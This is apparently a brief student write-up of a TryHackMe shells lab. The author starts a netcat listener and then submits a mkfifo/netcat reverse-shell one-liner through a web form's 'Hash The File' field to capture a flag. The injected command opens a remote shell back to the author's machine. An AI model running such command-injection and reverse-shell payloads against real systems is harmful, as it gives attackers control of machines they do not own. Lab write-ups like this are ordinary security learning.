*** Practical Task (Reverse Shell) ***

> After launching the THM Machine, i read through all the Shell types, learned about them and was given a task at the end. The first one was to find a flag that was saved in the "/ directory" using a
reverse/bind shell. To do this i first had to navigate to the website "10.201.61.117.8080" within Mozilla FireFox and was prompted to the Reverse/Bind Shell task.

> I then went ahead and opened up the Linux terminal and used Netcat to listen to a connection by inputting "nc -lvnp 4444," then "enter."

> Then selected "Reverse/Bind Shell task" and was prompted with an input field called "Hash The File" so i went ahead and inputted the command synthax
"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.201.54.152 4444 >/tmp/f," and pressed submit button.
